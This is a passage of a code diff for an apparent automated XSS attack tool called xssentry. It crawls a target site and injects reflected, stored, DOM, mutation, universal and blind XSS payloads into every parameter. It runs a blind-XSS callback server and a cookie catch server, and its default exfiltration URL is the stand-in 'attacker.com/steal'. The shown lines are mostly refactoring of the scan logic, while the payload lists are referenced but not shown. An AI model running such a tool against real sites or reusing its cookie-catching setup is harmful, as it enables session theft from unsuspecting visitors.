         tprint(f"  {info(str(len(endpoints)) + ' endpoints -- ' + str(len(BLIND_PAYLOADS)) + ' blind payloads')}")
 
         injected = 0
@@ -1926,7 +2146,7 @@ class BlindXSSTester:
             params = ep["params"]
             method = ep["method"]
             for param in params:
-                for pl_tmpl in BLIND_PAYLOADS[:6]:   # top 6 for speed
+                for pl_tmpl in BLIND_PAYLOADS[:6]:
                     pl = self._make_payload(pl_tmpl, param, url)
                     test_params = {**params, param: pl}
                     try:
@@ -1939,21 +2159,18 @@ class BlindXSSTester:
 
         tprint(f"  {info(f'{injected} blind payloads injected --- polling {len(BLIND_PAYLOADS[:6])*8}s---')}")
 
-        # Poll for hits --- stored blind XSS may fire when page is visited later
-        # We poll for a short window; real Blind XSS needs human to visit
         for _ in range(20):
             hit, data = blind_server.poll(self.token, timeout=0.5)
             if hit:
                 finding = {"type":"blind","data":data}
                 with self._lock: self.findings.append(finding)
-                tprint(f"  {color('BLIND XSS CONFIRMED', C.BRED, C.BOLD)}  "
-                       f"{color(data.get('src','?')[:60], C.CYAN)}")
+                tprint(f"  [bold red]BLIND XSS CONFIRMED[/bold red]  [cyan]{data.get('src','?')[:60]}[/cyan]")
                 break
             time.sleep(0.3)
 
         tprint(f"  {ok(f'Blind XSS scan done --- {len(self.findings)} confirmed callbacks')}")
-        tprint(f"  {color("  Note: Blind XSS may fire later when a victim views the page.", C.DIM)}")
-        tprint(f"  {color(f"  Monitor: {self.burl}", C.DIM)}")
+        tprint(f"  [dim]  Note: Blind XSS may fire later when a victim views the page.[/dim]")
+        tprint(f"  [dim]  Monitor: {self.burl}[/dim]")
         return self.findings
 
 
@@ -1996,7 +2213,7 @@ def print_report(findings, target, stats, caught_cookies,
         st_table.add_column("Param", style="bold red")
         st_table.add_column("Retrieval URL", style="cyan")
         for f in stored:
-            st_table.add_row(f["inject_url"][:40], f["inject_param"], f["found_at"][:40])
+            st_table.add_row(f["inject_url"][:40], f.get("param", f.get("inject_param", "N/A")), f["found_at"][:40])
         console.print(st_table)
         console.print()
 
@@ -2054,28 +2271,29 @@ def export_json(findings, target, stats, caught_cookies, path,
 # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 def run_external_spider(target, args):
     """Executes external Hellhound Spider and parses JSON output."""
-    temp_json = f".spider_{int(time.time())}.json"
-    cmd = [sys.executable, "spider.py", target, "--out", temp_json]
+    _script_dir = os.path.dirname(os.path.abspath(__file__))
+    spider_path = os.path.join(_script_dir, "spider.py")
+    temp_json   = os.path.join(_script_dir, f".spider_{int(time.time())}.json")
+    cmd = [sys.executable, spider_path, target, "--out", temp_json]
     if getattr(args, "verbose", False): cmd.append("--verbose")
     
     with Progress(
-        SpinnerColumn(),
-        TextColumn("[bold cyan]PHASE 1/2 --- RECONNAISSANCE BY HELLHOUND-SPIDER[/]"),
-        BarColumn(complete_style="cyan"),
+        BrailleWaveColumn(),
+        TextColumn("[bold red]PHASE 1/2 ─── RECONNAISSANCE BY HELLHOUND-SPIDER[/]"),
         console=console,
         transient=True
     ) as progress_bar:
         task = progress_bar.add_task("Crawling...", total=None) # Indeterminate
         try:
-            # If verbose, we let the output flow so the user can see it
             if getattr(args, "verbose", False):
-                subprocess.run(cmd, check=True)
+                subprocess.run(cmd, check=True, cwd=_script_dir)
             else:
-                subprocess.run(cmd, check=True, capture_output=True)
+                subprocess.run(cmd, check=True, capture_output=True, cwd=_script_dir)
             if not os.path.exists(temp_json):
                 return []
             with open(temp_json, "r") as f: data = json.load(f)
-            os.remove(temp_json) # Cleanup
+            try: os.remove(temp_json)
+            except OSError: pass
 
             raw_eps = []
             for ep in data.get("endpoints", []):
@@ -2128,7 +2346,7 @@ def main():
         epilog="""
 Examples:
   python3 xssentry.py https://target.com
-  python3 xssentry.py https://target.com -d 5 -t 16
+  python3 xssentry.py https://target.com --tier 6 -d 5 -t 16
   python3 xssentry.py https://target.com -o report.json
 
   Authorized security testing only.
@@ -2146,7 +2364,7 @@ Examples:
     ap.add_argument("--timeout",            type=int,   default=8,
                     help="HTTP timeout per request in seconds (default: 8)")
     ap.add_argument("--blind-port",         type=int, default=0,
-                    help="Port for blind XSS OOB server (0=random, -1=disable blind scan)")
+                    help="Port for blind XSS OOB server (0=random, -1=disable)")
     ap.add_argument("--cookie",             default=None,
                     help="Session cookie or Authorization header for authenticated scans")
     ap.add_argument("--no-stored",          action="store_true",
@@ -2167,13 +2385,13 @@ Examples:
     with console.status("[bold cyan]Initializing Engines and Resources...", spinner="dots"):
         time.sleep(0.5)
 
-    # -- Autonomous tier selection (5 by default) ------------------------------------------------
-    args.tier = 5  # Always tier 5 - fully autonomous
+    # Autonomous tier — always 5
+    args.tier = 5
 
     console.print(info(f'Target: [bold white]{target}[/]'))
     console.print()
 
-    # ------ Cookie catch server ---------------------------------------------------------------------------------------------------------------------------------------------------------
+    # ------ Cookie catch server -----------------------------------------------------------------------
     cookie_srv  = None
     catcher_url = args.cookie_catcher or "https://attacker.com/steal"
 
@@ -2190,33 +2408,28 @@ Examples:
     elif args.cookie_catcher:
         tprint(f"  {ck_lbl(f'Cookie catcher: {color(catcher_url, C.fg(214))}')}\n")
 
-    cookie = getattr(args, "cookie", None)
-    client = HTTPClient(timeout=args.timeout)
-
-    # ------ Phase 1: Target Definition (Automatic Spider or JSON) ------------------------------------------------------------------------------------------------------------------
+    client    = HTTPClient(timeout=args.timeout)
     hud_state = HUDState(target)
-    
+
     # AUTOMATIC SPIDER RUN (always)
     final_eps = run_external_spider(target, args)
     if not final_eps:
-        hud_state.update(log="[yellow]Spider found 0 endpoints, using target URL directly.[/]")
-        p = urllib.parse.urlparse(target); qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
+        hud_state.update(log="Spider found 0 endpoints, using target URL directly.")
+        p  = urllib.parse.urlparse(target)
+        qs = urllib.parse.parse_qs(p.query, keep_blank_values=True)
         final_eps = [{"url": p._replace(query="").geturl(), "method": "GET",
-                    "params": {k: (v[0] if v else "") for k, v in qs.items()}, 
-                    "hidden": {}, "source": "cli"}]
+                      "params": {k: (v[0] if v else "") for k, v in qs.items()},
+                      "hidden": {}, "source": "cli"}]
     stats = {"pages": len(set(e["url"] for e in final_eps)), "js_files": 0, "spa_eps": 0}
 
-    hud_state.update(endpoints_total=len(final_eps))
-    hud_state.update(current_action="Audit Initialization")
+    hud_state.update(endpoints_total=len(final_eps), current_action="Audit Initialization")
 
     if not final_eps:
         tprint(f"  {err('No testable endpoints found.')}")
         if cookie_srv: cookie_srv.stop()
         sys.exit(0)
 
-    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-    # START TACTICAL HUD
-    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    # ------ START TACTICAL HUD -----------------------------------------------------------------------
     hud_ui = CyberTacticalHUD(hud_state)
 
     def _hud_refresh(live, hud_ui, stop_event):
@@ -2228,26 +2441,25 @@ Examples:
         _stop = threading.Event()
         _refresher = threading.Thread(target=_hud_refresh, args=(live, hud_ui, _stop), daemon=True)
         _refresher.start()
+
         # Phase 4: Reflected XSS Testing
-        tester = XSSTester(client, tier=args.tier, delay=args.delay, catcher=catcher_url, hud_state=hud_state)
+        tester   = XSSTester(client, tier=args.tier, delay=args.delay, catcher=catcher_url, hud_state=hud_state)
         findings = tester.run(final_eps, catcher_obj=cookie_srv, threads=args.threads)
-        caught = cookie_srv.summary() if cookie_srv else []
+        caught   = cookie_srv.summary() if cookie_srv else []
 
         # Phase 5: Stored XSS
         hud_state.update(current_action="Stored XSS Scan")
         stored_findings = []
         if not getattr(args, "no_stored", False):
-            writable_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
-            if writable_eps:
-                _visited = list(set(e["url"] for e in final_eps))
-                stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
-                stored_findings = stored_scanner.scan(writable_eps, target)
+            _visited = list(set(e["url"] for e in final_eps))
+            stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
+            stored_findings = stored_scanner.scan(final_eps, target, hud_state=hud_state)
 
         # Phase 6: DOM XSS
         hud_state.update(current_action="DOM XSS Scan")
         dom_findings = []
         if not getattr(args, "no_dom", False):
-            dom_scanner = DOMXSSScanner(client)
+            dom_scanner  = DOMXSSScanner(client)
             dom_eps_done = set()
             for ep in final_eps:
                 url = ep["url"]
@@ -2255,28 +2467,23 @@ Examples:
                 dom_eps_done.add(url)
                 try:
                     resp = client.get(url, ep["params"])
-                    body = resp.get("body","")
-                    static = dom_scanner.scan_js_source(url, body)
-                    dom_findings.extend(static)
-                    dynamic = dom_scanner.probe_params(url, ep["params"])
-                    dom_findings.extend(dynamic)
+                    body = resp.get("body", "")
+                    dom_findings.extend(dom_scanner.scan_js_source(url, body))
+                    dom_findings.extend(dom_scanner.probe_params(url, ep["params"]))
                 except Exception: pass
 
         # Phase 7: mXSS
         hud_state.update(current_action="Mutation XSS Scan")
         mxss_findings = []
         if not getattr(args, "no_stored", False):
-            mxss_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
-            for ep in mxss_eps[:10]:
+            for ep in [e for e in final_eps if e["method"] in ("POST","PUT")][:10]:
                 for param in ep["params"]:
                     for mpl in MXSS_PAYLOADS[:6]:
                         try:
                             resp = client.post(ep["url"], {**ep["params"], param: mpl})
                             if any(s in resp.get("body","") for s in ["alert(1)","onerror=alert"]):
-                                f = {"type":"mxss","url":ep["url"],"param":param,"payload":mpl[:60],"score":85}
-                                mxss_findings.append(f)
-                                hud_state.add_finding(f)
-                                break
+                                f = {"type":"mxss","url":ep["url"],"param":param,"payload":mpl[:60],"score":85,"xss_type":"mxss"}
+                                mxss_findings.append(f); hud_state.add_finding(f); break
                         except Exception: pass
 
         # Phase 8: uXSS
@@ -2286,24 +2493,23 @@ Examples:
             for param in list(ep["params"].keys())[:3]:
                 for upl in UXSS_PAYLOADS[:5]:
                     try:
-                        resp = client.get(ep["url"], {**ep["params"], param: upl}) if ep["method"] == "GET" else client.post(ep["url"], {**ep["params"], param: upl})
+                        resp = (client.get(ep["url"], {**ep["params"], param: upl}) if ep["method"] == "GET"
+                                else client.post(ep["url"], {**ep["params"], param: upl}))
                         if "alert(document.domain)" in resp.get("body",""):
-                            f = {"type":"uxss","url":ep["url"],"param":param,"payload":upl[:60],"score":90}
-                            uxss_findings.append(f)
-                            hud_state.add_finding(f)
-                            break
+                            f = {"type":"uxss","url":ep["url"],"param":param,"payload":upl[:60],"score":90,"xss_type":"uxss"}
+                            uxss_findings.append(f); hud_state.add_finding(f); break
                     except Exception: pass
 
         # Phase 9: Blind XSS
         hud_state.update(current_action="Blind XSS Scan")
         blind_findings = []
-        blind_srv = None
-        blind_port = getattr(args, "blind_port", 0)
+        blind_srv      = None
+        blind_port     = getattr(args, "blind_port", 0)
         if not getattr(args, "no_blind", False) and blind_port != -1:
             blind_srv = BlindXSSServer(port=blind_port if blind_port else 0)
             blind_url = blind_srv.start()
             if blind_url:
-                blind_token = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
+                blind_token  = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
                 blind_tester = BlindXSSTester(client, blind_url, blind_token)
                 blind_findings = blind_tester.scan(final_eps, blind_srv)
                 for bf in blind_findings:
